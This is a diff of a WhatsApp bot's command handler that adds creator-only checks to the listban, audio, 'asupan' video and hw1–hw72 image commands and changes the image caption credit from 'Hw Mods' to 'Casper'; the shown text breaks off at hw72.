@@ -4576,6 +4748,7 @@ haikal.sendMessage(m.chat, message, { quoted:m })
 break
 //=================================================//
 case 'listban':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
@@ -4600,6 +4773,7 @@ Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak List Ban Bot Ada Di List`, 
 break
 //=================================================//
 case 'oke': case 'anjing': case 'anjay': case 'ajg': case 'thx': case 'thanks' : case 'makasih': case 'mksh': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "audioMessage": {
@@ -4620,6 +4794,7 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 break
 
 case 'lagu': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "audioMessage": {
@@ -4641,6 +4816,7 @@ break
 //=================================================//
 
 case 'asupan1': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4662,6 +4838,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4683,6 +4860,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan3': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4704,6 +4882,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4725,6 +4904,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4746,6 +4926,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4767,6 +4948,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4788,6 +4970,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4809,6 +4992,7 @@ haikal.relayMessage(m.chat, video.message, { messageId: video.key.id })
 }
 break
 case 'asupan9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "videoMessage": {
@@ -4870,401 +5054,481 @@ haikal.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4' })
 })
 break
 case 'hw1': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw1,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw1,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw2,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw2,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw3': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw3,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw3,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw4': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw4,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw5,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw5,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw6': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw6,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw6,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw7': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw7,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw7,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw8': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw8,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw9': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw9,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw10': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw10,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw11': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw11,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw12': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw12,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw13': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw13,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw14': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw14,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw15': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw15,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw16': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw16,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw17': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw17,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw18': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw18,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw19': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw19,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw20': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw20,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw21': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw21,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw22': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw22,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw23': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw23,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw24': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw24,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw25': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw25,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw26': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw26,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw27': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw27,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw28': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw28,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw29': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw29,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw30': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw30,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw31': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw31,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw32': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw32,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw33': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw33,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw34': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw34,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw35': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw35,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw36': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw36,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw37': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw37,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw38': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw38,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw39': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw39,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw40': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw40,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw41': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw41,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw42': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw42,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw43': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw43,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw44': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw44,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw45': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw45,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw46': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw46,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw47': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw47,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw48': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw48,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw49': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw49,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw49,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw50': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw50,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw50,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw51': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw51,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw51,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw52': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw52,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw52,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw53': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw53,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw53,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw54': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw54,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw54,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw55': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw55,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw55,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw56': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw56,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw56,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw57': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw57,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw57,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw58': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw58,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw58,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw59': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw59,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw59,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw60': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw60,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw60,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw61': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw61,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw61,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw62': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw62,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw62,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw63': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw63,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw63,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw64': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw64,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw64,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw65': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw65,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw65,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw66': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw66,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw66,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw67': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw67,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw67,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw68': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw68,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw68,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw69': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw69,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw69,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw70': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw70,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw70,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw71': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
-haikal.sendMessage(m.chat, { image: hw71,  caption: `© Created By Hw Mods` }, { quoted:m })
+haikal.sendMessage(m.chat, { image: hw71,  caption: `© Created By Casper` }, { quoted:m })
 }
 break
 case 'hw72': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
